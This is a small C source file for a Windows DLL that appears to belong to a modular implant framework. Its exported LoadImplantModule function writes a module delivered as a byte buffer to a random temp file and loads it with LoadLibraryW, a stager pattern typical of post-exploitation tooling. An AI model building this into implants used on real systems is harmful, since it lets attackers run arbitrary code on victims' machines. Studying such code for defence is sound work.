
#include <Windows.h>

#include "ModularImplant.h"

__declspec(dllexport)
BOOL
LoadImplantModule(
	_In_ PVOID pModuleData,
	_In_ DWORD cbModuleLen,
	_Out_ PLOADED_MODULE pLoadedModule);

BOOL WINAPI
DllMain(
	HINSTANCE hinstDLL,
	DWORD fdwReason,
	LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

BOOL
LoadImplantModule(
	_In_ PVOID pModuleData,
	_In_ DWORD cbModuleLen,
	_Out_ PLOADED_MODULE pLoadedModule)
{
	if (!pLoadedModule)
	{
		return FALSE;
	}
	ZeroMemory(pLoadedModule, sizeof(*pLoadedModule));

	PWSTR pwszTempFileName = NULL;
	HMODULE hModule = NULL;
	
	pwszTempFileName = HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(*pwszTempFileName) * MAX_PATH);
	if (NULL == pwszTempFileName)
	{
		LOG_ERROR("HeapAlloc failed");
		goto fail;
	}

	if (FALSE == GetRandomTempFileNameW(pwszTempFileName, MAX_PATH))
	{
		goto fail;
	}

	if (FALSE == WriteDataToFile(pwszTempFileName, pModuleData, cbModuleLen))
	{
		goto fail;
	}

	hModule = LoadLibraryW(pwszTempFileName);
	if (NULL == hModule)
	{
		LOG_ERROR("LoadLibrary failed");
		goto fail;
	}

	pLoadedModule->hModule = hModule;
	pLoadedModule->pwszModuleFileName = pwszTempFileName;

	return TRUE;

fail:
	if (NULL != pwszTempFileName)
	{
		HeapFree(GetProcessHeap(), 0, pwszTempFileName);
		pwszTempFileName = NULL;
	}

	return FALSE;
}